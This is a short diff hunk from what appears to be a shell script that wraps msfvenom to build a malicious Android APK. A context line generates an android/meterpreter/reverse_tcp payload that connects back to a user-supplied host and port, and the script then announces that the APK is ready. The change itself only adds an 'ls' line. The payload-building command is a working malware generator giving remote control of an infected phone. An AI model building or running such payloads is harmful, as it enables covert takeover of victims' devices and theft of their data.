@@ -10,5 +10,6 @@ read name
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $name.apk
 echo "know U have Your apk"
 echo "Have a nice day"
+ls
 
 
